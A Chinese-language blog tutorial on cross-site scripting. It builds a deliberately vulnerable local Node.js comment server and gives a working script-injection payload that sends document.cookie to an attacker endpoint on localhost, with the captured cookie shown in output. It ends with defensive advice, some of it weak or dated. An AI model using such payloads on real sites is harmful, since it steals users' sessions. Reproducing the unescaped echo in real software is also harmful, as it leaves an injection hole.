---
title: XSS 攻击原理、实战、预防
date: 2018-03-18 21:32:34
categories:
- 后端
tags:
- XSS攻击
---

```
目录：
1. XSS 攻击原理——脚本注入，如何注入？
2. XSS 攻击实战 —— node 模拟服务端提供网站
3. XSS 如何预防
```

# 1. 原理

常见攻击场景：在论坛或博客的下方经常会有留言功能，输入内容：`测试数据`，留言内容会被一个 h 标签包裹，F12 控制台会打印：

![留言数据](http://upload-images.jianshu.io/upload_images/6693922-1d300716e748d8f8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

现在在下方留言 `测试数据</h><script>alert('xss test')</script><h>` ，F12 控制台可以看到我们自己写的脚本通过简单伪装就被植入到该网站，关键是直接看页面压根看不出啥变化。

![XSS 攻击](http://upload-images.jianshu.io/upload_images/6693922-dd296003678da83a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

这里的脚本比较简单，如果对脚本稍加修改，比如自执行函数，页面打开时自动运行；让脚本会获取 [浏览器保存的用户登录密码](chrome://settings/passwords)，再通过一些手段发送给攻击者，那么攻击者就成功盗取用户账号。

**举个栗子**：假设简书上上某一篇文章下方评论里被攻击者注入了攻击脚本，其它用户只要打开这篇文章，攻击脚本自动执行，将打开该文章的用户身份信息发送给攻击者。那么攻击者就可以使用当前登录用户的简书账号密码去做坏事了.......

# 2. 实战

使用 node 作为服务器提供论坛下方评论功能，模拟 XSS 攻击过程。

假设你计算机安装了 node 环境，拷贝下方内容，保存为 index.js。`node index.js` 运行服务，在浏览器输入 `localhost:3000/` 回车。

```
// index.js
const http = require('http');
const fs = require('fs');
const url = require('url');

const server = http.createServer(function (req, res) {
    if (req.url === '/favicon.ico') {
        return;
    }
    const parseUrl = url.parse(req.url, true);

    console.log('>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>')
    console.log(parseUrl)

	// 路由1 /uploadForm	提交表单处理方法，在页面显示刚才表单内填写的内容
	// 路由2 /xssattack		xss 攻击接收浏览器发来的 cookie 接口
	// 路由3 /  			返回一个表单
    if (parseUrl.pathname === '/uploadForm') {
        res.writeHead(200, {'content-Type':'text/html;charset=UTF-8'})
        const username = parseUrl.query.username;
        res.write(`<h>${username}</h>`);
        res.end();
    } else if (parseUrl.pathname === '/xssattack') {
        res.writeHead(200, {'content-Type':'text/html;charset=UTF-8'})
        const pw = parseUrl.query.pw;
        res.write(`i received message：${pw}`)
        res.end();
    } else {
		res.writeHead(200, {'content-Type':'text/html;charset=UTF-8', 'Set-Cookie': 'myCookie=test'})
		res.write(`
			<form method="get" action="/uploadForm">
				<input type="text" style="width: 600px;" placeholder="输入用户名" name="username">
				<button type="submit">提交</button>
			</form>
		`)
		res.end();
	}
});

server.listen(3000, function () {
    console.log('server is starting on port 3000');
});
```

该服务提供了三个接口。

- `localhost:3000/`  node 服务器返回一个表单页面；
- `localhost:3000/uploadForm` 表单提交按钮处理方法，将表单文本框中内容打印到页面上；
- `localhost:3000/xssattack` 攻击脚本获取到当前登录用户的身份信息，如账号密码，或者 cookie 等，发送到攻击者自己的服务器上。

这里提供一份攻击脚本，作用是获取当前登录用户的 cookie，然后发送给攻击者自己服务器上某个接口。直接复制内容到表单文本框中。

```
测试数据</h><script>(function () {var str = document.cookie;var a =document.createElement('a');a.setAttribute('id', 'xxlkjxljklxjklfasdf');a.href='http://localhost:3000/xssattack?cookie='+str;document.body.appendChild(a);document.getElementById('xxlkjxljklxjklfasdf').click();})()</script><h>
```

攻击脚本源码（仅供参考，为什么获取 cookie 不直接获取账号密码，以及使用 a 标签跳转的方式在浏览器地址栏会暴露等等问题，这里都不做解释，这里仅是模拟 XSS 攻击的过程）：
```
// 攻击脚本自执行函数：获取 cookie，发送给攻击者服务器 localhost:3000/xssattack
<script>
(function () {
    var str = document.cookie;
    var a =document.createElement('a');
    a.setAttribute('id', 'xxlkjxljklxjklfasdf')
    a.href='http://localhost:3000/xssattack?cookie='+str
    document.body.appendChild(a);
    document.getElementById('xxlkjxljklxjklfasdf').click()
})()   
</script>   
```

在表单中输入包含注入脚本的伪装评论：

![表单中输入脚本代码](http://upload-images.jianshu.io/upload_images/6693922-b115cb07bc747559.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

点击提交，在终端可以看到下方打印消息。
```
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
Url {
  protocol: null,
  slashes: null,
  auth: null,
  host: null,
  port: null,
  hostname: null,
  hash: null,
  search: '?cookie=myCookie=test',
  query: { cookie: 'myCookie=test' },
  pathname: '/xssattack',
  path: '/xssattack?cookie=myCookie=test',
  href: '/xssattack?cookie=myCookie=test' }
```

验证浏览器中 cookie 是否正确：

![浏览器控制台打印 Cookie](http://upload-images.jianshu.io/upload_images/6693922-2bcd4ac1b14afa4b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

到此，攻击者就获取到登录用户的 Cookie，用了 cookie 就可以冒充当前登录用户去做些坏事了。当然这里获取账号密码更直接，在发送的使用邮件或其他方式都可以，保证隐蔽性。

# 3. 预防

XSS 攻击如此神出鬼没，关键是在页面上看不出任何差异，如何防范它呢？

- 对于普通用户

普通用户没有编程基础，不太能识别 XSS 攻击，建议使用谷歌浏览器，谷歌浏览器自带检测网站 XSS 攻击功能，如果谷歌浏览器检测到您当前访问的页面存在 XSS 攻击，不会运行注入脚本，会报错提示：

   ![谷歌浏览器自带 XSS 检测功能](http://upload-images.jianshu.io/upload_images/6693922-a2d6cfae1a50e90a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

我在火狐浏览器也做了下测试，发现火狐并不会检测 XSS 攻击脚本。（这里不是黑火狐，目前火狐主打的是访问速度，对安全这块可能并没有太多关注）

- 对于网站站长
  虽然 XSS 攻击并不会直接对网站造成影响，但是它总是盗取登录该网站用户的账号密码，搞不好哪天你的用户烦心了，不用这个网站了，网站丢失用户量是件很可怕的事。
  
  - **预防一：对于评论、文章内容等做转码操作**

  将评论、文章等取数据内容做转码，将 `<` 转码为 `&lt;`，`>` 转码为 `&gt;`，此时在浏览器中就可以看到注入脚本无处可藏，显露原型了。这也是目前使用比较广泛的一种，楼主测试了一下 `码云` 是否有 XSS 漏洞，发现它就是这种预防措施的。

  ![对评论内容做 html 转码](http://upload-images.jianshu.io/upload_images/6693922-456bb4224d061bca.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

  - **预防二：对表单内容做长度校验**

有些前端开发人员不注意安全，表单内文本框或文本域都不做长度校验，这就存在 XSS 攻击风险。上面也提到注入脚本一般长度很长，聪明一些的攻击者会将注入脚本进行压缩缩短长度。如果你的文本框长度只允许输入 10 个字符，嫩它注入脚本再厉害也是无计可施的。

![image.png](http://upload-images.jianshu.io/upload_images/6693922-34a814aac5162a21.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)






 


